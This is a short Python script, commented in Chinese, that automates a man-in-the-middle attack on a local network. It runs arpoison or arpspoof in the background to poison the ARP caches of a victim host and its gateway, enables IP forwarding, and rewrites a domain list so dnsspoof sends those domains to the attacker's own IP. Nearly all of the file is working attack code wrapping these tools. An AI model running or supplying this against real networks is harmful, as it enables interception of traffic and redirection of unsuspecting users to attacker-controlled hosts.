# -*- coding: utf-8 -*-

import os


### 网关部分  用于DNS转发

####  arpoison 

def cheatsarpoisonGateway(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs):


	cmd="nohup arpoison -i "  + device +" -d "  + ip + " -s " + gatewayips +"  -t " + remotemacs +" -r " +localmacs + " -w 2   >/dev/null 2>log &"
	#print(cmd)
	os.system(cmd) 

	cmd="nohup arpoison -i "  + device +" -d "  + gatewayips + " -s " + ip +"  -t " + gatewaymacs +" -r " +localmacs + " -w 2   >/dev/null 2>log &"  
	#print(cmd)
	os.system(cmd) 



####    arpspoof     ----- 未使用

def cheatsarpspoofGateway(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs):

	### 网关部分  用于DNS转发

	cmd="nohup arpspoof -i  " + device +" -c both -t "  + ip + " -r " + gatewayips  + " >/dev/null 2>log &" 
	#print(cmd)
	os.system(cmd)    


	""" 相当于
	arpspoof -i wlan0 -t A -r B   
	arpspoof -i wlan0 -t B -r A  
	"""


#### dnsspoof

def cheatdnsspoof(device,localips,dnsfile):

	"""
	### 域名写入本地映射文件   ---- 直接使用批量配置好的文件
	domainstr=localips +" "+  domain
	
	file_object = open(os.path.split(os.path.realpath(__file__))[0] + '/domain', 'w')
	file_object.write(domainstr)
	file_object.close()
	"""

	###

	cmd="echo 1 > /proc/sys/net/ipv4/ip_forward"
	#print(cmd)
	os.system(cmd)    

	####  处理配置文件
	paths=os.getcwd() 
	configfile=dnsfile + ".temp"
	cmd="touch " + configfile
	os.system(cmd)

	"""
	# 整个读取不处理
	(strings,lines)=openfiles(paths  + "/" + dnsfile)
	strings=strings.replace("127.0.0.1",localips)

	file_object = open(paths  + "/" + configfile, 'w')
	file_object.write(strings)
	file_object.close()
	"""

	f = open(paths  + "/" + dnsfile)            
	file_object = open(paths  + "/" + configfile, 'w')

	for line in f:  
		if line[0:1]!="#":       #非注释
			line=localips + " " + line
			file_object.write(line)

	f.close()
	file_object.close()	

	####

	cmd="nohup dnsspoof -i  " + device +" -f  " + configfile + " >/dev/null 2>log &"    #  testhost 格式:     127.0.0.1 www.456.com   指向本地,  注意这里的信息经过处理不是127.0.0.1
	#print(cmd)
	os.system(cmd) 





